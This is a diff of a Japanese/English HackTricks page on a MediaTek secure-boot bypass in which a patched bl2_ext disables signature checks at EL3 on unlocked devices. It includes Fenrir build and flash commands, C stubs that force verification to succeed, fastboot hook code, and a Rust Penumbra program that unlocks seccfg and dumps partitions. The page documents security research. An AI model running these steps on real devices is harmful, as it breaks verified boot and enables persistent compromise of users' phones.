@@ -2,150 +2,139 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このページでは、デバイスのブートローダ設定 (seccfg) が "unlocked" のときの検証の抜け穴を悪用して、複数の MediaTek プラットフォームで実際に行える secure-boot の破り方を記録します。この脆弱性により、ARM EL3 でパッチした bl2_ext を実行して下流の署名検証を無効化でき、信頼の連鎖が崩壊して TEE/GZ/LK/Kernel に任意の未署名イメージを読み込ませることが可能になります。
+このページは、seccfg が "unlocked" に設定されているときにデバイスブートローダ設定の検証ギャップを悪用することで、複数の MediaTek プラットフォームに対して実用的な Secure-Boot の破り方を記録します。脆弱性により、ARM EL3 でパッチされた bl2_ext を実行して下流の署名検証を無効化し、信頼の連鎖を崩して任意の非署名 TEE/GZ/LK/Kernel のロードを可能にします。
 
-> 注意: 早期ブートでのパッチ適用はオフセットが間違っているとデバイスを永久にブリックする可能性があります。常に完全なダンプと信頼できるリカバリ経路を用意してください。
+> 注意: Early-boot パッチはオフセットが間違っているとデバイスを永続的に文鎮化する可能性があります。必ず完全なダンプと確実なリカバリ手段を確保してください。
 
-## 影響を受けるブートフロー (MediaTek)
+## Affected boot flow (MediaTek)
 
 - 通常の経路: BootROM → Preloader → bl2_ext (EL3, verified) → TEE → GenieZone (GZ) → LK/AEE → Linux kernel (EL1)
-- 脆弱な経路: seccfg が unlocked に設定されている場合、Preloader は bl2_ext の検証をスキップすることがあります。Preloader は引き続き EL3 で bl2_ext にジャンプするため、細工した bl2_ext により以降のコンポーネントを未検証のままロードできます。
+- 脆弱な経路: seccfg が unlocked に設定されている場合、Preloader は bl2_ext の検証をスキップすることがあります。Preloader は依然として EL3 で bl2_ext にジャンプするため、細工された bl2_ext が以降の未検証コンポーネントをロードできます。
 
-重要な信頼境界:
-- bl2_ext は EL3 で実行され、TEE、GenieZone、LK/AEE、カーネルの検証を担当します。bl2_ext 自体が認証されていなければ、チェーン全体は簡単にバイパスされます。
+主要な信頼境界:
+- bl2_ext は EL3 で実行され、TEE、GenieZone、LK/AEE、カーネルの検証を行う責任があります。もし bl2_ext 自体が認証されていなければ、チェーンの残りは簡単にバイパスされます。
 
-## 根本原因
+## Root cause
 
-対象デバイスでは、seccfg が "unlocked" を示す場合に、Preloader が bl2_ext パーティションの認証を強制しません。これにより、攻撃者が制御する bl2_ext をフラッシュして EL3 で実行させることが可能になります。
+影響を受けるデバイスでは、seccfg が "unlocked" を示すときに Preloader が bl2_ext パーティションの認証を強制しません。これにより、攻撃者が制御する bl2_ext をフラッシュして EL3 で実行させることが可能になります。
 
-bl2_ext 内では、検証ポリシー関数をパッチして常に検証不要を返すようにできます。最小限の概念的なパッチ例は次のとおりです:
-```c
-// inside bl2_ext
-int sec_get_vfy_policy(...) {
-return 0; // always: "no verification required"
-}
-```
-この変更により、EL3で動作するパッチ済みbl2_extによってロードされる以降のすべてのイメージ（TEE、GZ、LK/AEE、Kernel）は、暗号学的チェックなしで受け入れられます。
+bl2_ext の内部では、検証ポリシー関数をパッチして検証不要と常に報告させる（または常に成功させる）ことができ、TEE/GZ/LK/Kernel の署名なし受け入れを強制できます。このパッチは EL3 で動作するため、下流コンポーネントが独自のチェックを実装していても有効です。
 
-## 対象のトリアージ方法 (expdb logs)
+## Practical exploit chain
 
-bl2_extのロード前後のブートログ（例: expdb）をダンプ/検査します。もし img_auth_required = 0 かつ 証明書の検証時間が ~0 ms であれば、強制はおそらく無効であり、デバイスは悪用可能です。
+1. OTA/firmware パッケージ、EDL/DA の読み出し、またはハードウェアダンプを通じて Preloader、bl2_ext、LK/AEE などのブートローダパーティションを入手する。
+2. bl2_ext の検証ルーチンを特定し、検証を常にスキップ／受け入れるようにパッチする。
+3. fastboot、DA、またはアンロック済みデバイスで許可されている類似のメンテナンスチャネルを使って改変した bl2_ext をフラッシュする。
+4. 再起動すると、Preloader が EL3 でパッチ済み bl2_ext にジャンプし、その後署名されていない下流イメージ（パッチ済み TEE/GZ/LK/Kernel）をロードして署名強制を無効化する。
 
-ログの抜粋例:
+デバイスがロック済み（seccfg locked）に構成されている場合、Preloader は bl2_ext を検証することが期待されます。その構成では、別の脆弱性がない限りこの攻撃は失敗します。
+
+## Triage (expdb boot logs)
+
+- bl2_ext のロード前後の boot/expdb ログをダンプする。`img_auth_required = 0` かつ証明書検証時間が ~0 ms の場合、検証がスキップされている可能性が高い。
+
+Example log excerpt:
 ```
 [PART] img_auth_required = 0
 [PART] Image with header, name: bl2_ext, addr: FFFFFFFFh, mode: FFFFFFFFh, size:654944, magic:58881688h
 [PART] part: lk_a img: bl2_ext cert vfy(0 ms)
 ```
-Note: Some devices reportedly skip bl2_ext verification even with a locked bootloader, which exacerbates the impact.
+- 一部のデバイスはロックされていても `bl2_ext` の検証をスキップします；`lk2` の secondary bootloader パスでも同様のギャップが確認されています。もし post-OTA の `Preloader` がロック解除状態で `img_auth_required = 1` を `bl2_ext` に対してログに出力しているなら、検証の強制は復元されている可能性が高いです。
 
-Devices that ship the lk2 secondary bootloader have been observed with the same logic gap, so grab expdb logs for both bl2_ext and lk2 partitions to confirm whether either path enforces signatures before you attempt porting.
+## Verification logic locations
 
-If a post-OTA Preloader now logs img_auth_required = 1 for bl2_ext even while seccfg is unlocked, the vendor likely closed the gap—see the OTA persistence notes below.
+- 関連するチェックは通常 `bl2_ext` イメージ内にあり、`verify_img` や `sec_img_auth` に類似した名前の関数内にあります。
+- パッチ適用済みのバージョンは、その関数に成功を返させるか、検証呼び出し自体を完全にバイパスします。
 
-## 実践的な悪用ワークフロー (Fenrir PoC)
+Example patch approach (conceptual):
+- TEE、GZ、LK、kernel イメージに対して `sec_img_auth` を呼ぶ関数を特定する。
+- その本体を即座に成功を返すスタブに置き換える、または検証失敗を処理する条件分岐を上書きする。
 
-Fenrir is a reference exploit/patching toolkit for this class of issue. It supports Nothing Phone (2a) (Pacman) and is known working (incompletely supported) on CMF Phone 1 (Tetris). Porting to other models requires reverse engineering the device-specific bl2_ext.
+パッチはスタック/フレームのセットアップを維持し、呼び出し元に期待されるステータスコードを返すようにすること。
 
-大まかな手順:
-- ターゲットの codename 用のデバイスの bootloader image を取得し、`bin/<device>.bin` として配置する
-- bl2_ext の検証ポリシーを無効化するパッチ済みイメージをビルドする
-- 生成した payload をデバイスにフラッシュする（ヘルパースクリプトは fastboot を想定）
+## Fenrir PoC workflow (Nothing/CMF)
 
-Commands:
+Fenrir はこの問題向けのリファレンスパッチツールキットです（Nothing Phone (2a) は完全にサポート、CMF Phone 1 は部分的にサポート）。大まかな流れ：
+- デバイスの bootloader イメージを `bin/<device>.bin` として配置する。
+- `bl2_ext` の検証ポリシーを無効化したパッチ適用済みイメージをビルドする。
+- 生成されたペイロードを flash する（fastboot helper が提供される）。
 ```bash
-# Build patched image (default path bin/[device].bin)
-./build.sh pacman
-
-# Build from a custom bootloader path
-./build.sh pacman /path/to/your/bootloader.bin
-
-# Flash the resulting lk.patched (fastboot required by the helper script)
-./flash.sh
+./build.sh pacman                    # build from bin/pacman.bin
+./build.sh pacman /path/to/boot.bin  # build from a custom bootloader path
+./flash.sh                           # flash via fastboot
 ```
-If fastboot が利用できない場合は、プラットフォームに適した代替の flashing method を使用する必要があります。
+Use another flashing channel if fastboot is unavailable.
 
-### OTA-patched firmware: bypass を維持する (NothingOS 4、2025年後半)
+## EL3 パッチノート
 
-Nothing は 2025年11月の NothingOS 4 安定版 OTA (build BP2A.250605.031.A3) で Preloader をパッチし、seccfg がアンロックされていても bl2_ext の検証を強制するようにしました。Fenrir `pacman-v2.0` は、NOS 4 beta の脆弱な Preloader と安定した LK payload を組み合わせることで再び動作します:
-```bash
-# on Nothing Phone (2a), unlocked bootloader, in bootloader (not fastbootd)
-fastboot flash preloader_a preloader_raw.img   # beta Preloader bundled with fenrir release
-fastboot flash lk pacman-fenrir.bin            # patched LK containing stage hooks
-fastboot reboot                                # factory reset may be needed
-```
-重要:
-- 提供された Preloader は**必ず**対応する device/slot にのみフラッシュすること; 間違った Preloader を使うと即座にハードブリックします。
-- フラッシュ後に expdb を確認すること; bl2_ext の img_auth_required が 0 に戻っていることを確認し、脆弱な Preloader がパッチ済みの LK より前に実行されていることを確認する。
-- 将来の OTAs が Preloader と LK の両方を修正した場合に備え、脆弱な Preloader のローカルコピーを保持してギャップを再導入できるようにしておく。
+- bl2_ext executes in ARM EL3. Crashes here can brick a device until reflashed via EDL/DA or test points.
+- Use board-specific logging/UART to validate execution path and diagnose crashes.
+- Keep backups of all partitions being modified and test on disposable hardware first.
 
-### ビルド自動化と payload デバッグ
+## 影響
 
-- `build.sh` は最初に実行した際に Arm GNU Toolchain 14.2 (aarch64-none-elf) を自動でダウンロードしてエクスポートするため、クロスコンパイラを手動で切り替える必要はありません。
-- `build.sh` を呼び出す前に `DEBUG=1` をエクスポートすると、payloads が詳細なシリアル出力付きでコンパイルされ、EL3 のコードパスを blind-patching する際に非常に役立ちます。
-- ビルドが成功すると `lk.patched` と `<device>-fenrir.bin` の両方が生成されます。後者には既に payload が注入されており、これを flash/boot-test すべきです。
+- EL3 code execution after Preloader and full chain-of-trust collapse for the rest of the boot path.
+- Ability to boot unsigned TEE/GZ/LK/Kernel, bypassing secure/verified boot expectations and enabling persistent compromise.
 
-## Runtime payload capabilities (EL3)
-
-パッチ済みの bl2_ext payload は次のことが可能です:
-- カスタム fastboot コマンドを登録する
-- ブートモードを制御/オーバーライドする
-- 実行時に組み込みの bootloader 関数を動的に呼び出す
-- 実際にはアンロックされた状態でも「ロック状態」をロック済みとして偽装し、より厳しい整合性チェックを通過させる（環境によっては vbmeta/AVB の調整が依然として必要になる場合があります）
-
-制約: 現在の PoCs は、MMU の制約によりランタイムでのメモリ変更がフォルトを起こす可能性があると指摘しているため、問題が解決するまでは payloads は通常ライブメモリ書き込みを避けます。
-
-## Payload staging patterns (EL3)
-
-Fenrir はインストルメンテーションを 3 つのコンパイル時ステージに分割します: stage1 は `platform_init()` より前に実行され、stage2 は LK が fastboot エントリを通知する前に実行され、stage3 は LK が Linux をロードする直前に実行されます。`payload/devices/` 以下の各デバイスヘッダは、これらのフック用アドレスと fastboot ヘルパーシンボルを提供するので、これらのオフセットをターゲットビルドと同期させてください。
-
-Stage2 は任意の `fastboot oem` verbs を登録するのに便利な場所です:
-```c
-void cmd_r0rt1z2(const char *arg, void *data, unsigned int sz) {
-video_printf("r0rt1z2 was here...\n");
-fastboot_info("pwned by r0rt1z2");
-fastboot_okay("");
-}
-
-__attribute__((section(".text.main"))) void main(void) {
-fastboot_register("oem r0rt1z2", cmd_r0rt1z2, true, false);
-notify_enter_fastboot();
-}
-```
-Stage3 は、downstream kernel access を必要とせずに、Android の “Orange State” 警告のような不変の文字列をパッチするためにページテーブル属性を一時的に反転させる方法を示します:
-```c
-set_pte_rwx(0xFFFF000050f9E3AE);
-strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");
-```
-Because stage1 fires prior to platform bring-up, it is the right place to call into OEM power/reset primitives or to insert additional integrity logging before the verified boot chain is torn down.
-
-## ポーティングのヒント
-
-- デバイス固有の bl2_ext をリバースエンジニアリングして、検証ポリシーロジック（例: sec_get_vfy_policy）を特定する。
-- ポリシーの戻り箇所または判定ブランチを特定し、“no verification required”（return 0 / unconditional allow）にパッチする。
-- オフセットは完全にデバイスおよびファームウェア固有に保ち、バリアント間でアドレスを使い回さない。
-- まずは犠牲ユニットで検証する。フラッシュする前にリカバリープラン（例: EDL/BootROM loader/SoC-specific download mode）を用意しておく。
-- lk2 セカンダリブートローダーを使用しているか、ロック状態でも bl2_ext に対して “img_auth_required = 0” を報告するデバイスは、本脆弱性クラスの影響を受けるコピーと見なすべきである；Vivo X80 Pro は報告されたロック状態にもかかわらず検証をスキップする例が既に観測されている。
-- OTA がアンロック状態で bl2_ext の署名（img_auth_required = 1）を強制し始めた場合、古い Preloader（beta OTA にしばしば含まれる）をフラッシュして隙間を再度開けられるかを確認し、その後 newer LK 用にオフセットを更新して fenrir を再実行する。
-
-## セキュリティへの影響
-
-- Preloader の後に EL3 コードが実行され、以降のブートパスで chain-of-trust が完全に崩壊する。
-- unsigned な TEE/GZ/LK/Kernel を起動できるようになり、secure/verified boot の期待をバイパスして永続的な侵害を可能にする。
-
-## デバイス注記
+## デバイスノート
 
 - Confirmed supported: Nothing Phone (2a) (Pacman)
 - Known working (incomplete support): CMF Phone 1 (Tetris)
 - Observed: Vivo X80 Pro reportedly did not verify bl2_ext even when locked
-- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) re-enabled bl2_ext verification; fenrir `pacman-v2.0` restores the bypass by flashing the beta Preloader plus patched LK as shown above
+- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) re-enabled bl2_ext verification; fenrir `pacman-v2.0` restores the bypass by mixing the beta Preloader with a patched LK
 - Industry coverage highlights additional lk2-based vendors shipping the same logic flaw, so expect further overlap across 2024–2025 MTK releases.
 
-## References
+## MTK DA readback and seccfg manipulation with Penumbra
+
+Penumbra is a Rust crate/CLI/TUI that automates interaction with MTK preloader/bootrom over USB for DA-mode operations. With physical access to a vulnerable handset (DA extensions allowed), it can discover the MTK USB port, load a Download Agent (DA) blob, and issue privileged commands such as seccfg lock flipping and partition readback.
+
+- **Environment/driver setup**: On Linux install `libudev`, add the user to the `dialout` group, and create udev rules or run with `sudo` if the device node is not accessible. Windows support is unreliable; it sometimes works only after replacing the MTK driver with WinUSB using Zadig (per project guidance).
+- **Workflow**: Read a DA payload (e.g., `std::fs::read("../DA_penangf.bin")`), poll for the MTK port with `find_mtk_port()`, and build a session using `DeviceBuilder::with_mtk_port(...).with_da_data(...)`. After `init()` completes the handshake and gathers device info, check protections via `dev_info.target_config()` bitfields (bit 0 set → SBC enabled). Enter DA mode and attempt `set_seccfg_lock_state(LockFlag::Unlock)`—this only succeeds if the device accepts extensions. Partitions can be dumped with `read_partition("lk_a", &mut progress_cb, &mut writer)` for offline analysis or patching.
+- **Security impact**: Successful seccfg unlocking reopens flashing paths for unsigned boot images, enabling persistent compromises such as the bl2_ext EL3 patching described above. Partition readback provides firmware artifacts for reverse engineering and crafting modified images.
+
+<details>
+<summary>Rust DA session + seccfg unlock + partition dump (Penumbra)</summary>
+```rust
+use tokio::fs::File;
+use anyhow::Result;
+use penumbra::{DeviceBuilder, LockFlag, find_mtk_port};
+use tokio::io::{AsyncWriteExt, BufWriter};
+
+#[tokio::main]
+async fn main() -> Result<()> {
+let da = std::fs::read("../DA_penangf.bin")?;
+let mtk_port = loop {
+if let Some(port) = find_mtk_port().await {
+break port;
+}
+};
+
+let mut dev = DeviceBuilder::default()
+.with_mtk_port(mtk_port)
+.with_da_data(da)
+.build()?;
+
+dev.init().await?;
+let cfg = dev.dev_info.target_config().await;
+println!("SBC: {}", (cfg & 0x1) != 0);
+
+dev.set_seccfg_lock_state(LockFlag::Unlock).await?;
+
+let mut progress = |_read: usize, _total: usize| {};
+let mut writer = BufWriter::new(File::create("lk_a.bin")?);
+dev.read_partition("lk_a", &mut progress, &mut writer).await?;
+writer.flush().await?;
+Ok(())
+}
+```
+</details>
+
+## 参考資料
 
 - [Fenrir – MediaTek bl2_ext secure‑boot bypass (PoC)](https://github.com/R0rt1z2/fenrir)
 - [Cyber Security News – PoC Exploit Released For Nothing Phone Code Execution Vulnerability](https://cybersecuritynews.com/nothing-phone-code-execution-vulnerability/)
 - [Fenrir pacman-v2.0 release (NothingOS 4 bypass bundle)](https://github.com/R0rt1z2/fenrir/releases/tag/pacman-v2.0)
 - [The Cyber Express – Fenrir PoC breaks secure boot on Nothing Phone 2a/CMF1](https://thecyberexpress.com/fenrir-poc-for-nothing-phone-2a-cmf1/)
+- [Penumbra – MTK DA flash/readback & seccfg tooling](https://github.com/shomykohai/penumbra)
 
 {{#include ../../banners/hacktricks-training.md}}
